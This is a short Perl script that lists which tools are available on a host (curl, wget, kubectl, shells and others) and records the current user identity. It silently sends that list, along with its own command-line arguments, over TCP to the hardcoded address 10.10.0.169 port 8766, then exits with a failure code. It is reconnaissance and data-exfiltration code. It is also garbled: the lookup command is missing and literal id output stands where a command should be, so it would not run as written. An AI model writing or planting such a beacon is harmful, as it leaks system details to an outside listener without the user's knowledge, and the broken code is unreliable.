#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
my @bins = qw(curl wget python3 python ruby kubectl sh bash perl);
my @found;
for my $b (@bins) { my $p = ; chomp $p; push @found, "$b=$p" if $p; }
my $who = uid=1000(devbox) gid=1000(devbox) groups=1000(devbox); chomp $who;
my $sock = IO::Socket::INET->new(PeerAddr => '10.10.0.169', PeerPort => 8766, Proto => 'tcp', Timeout => 3);
if ($sock) { print $sock "bins ".join(',', @found)." id=$who args=".join(' ', @ARGV)."\n"; close($sock); }
exit 1;
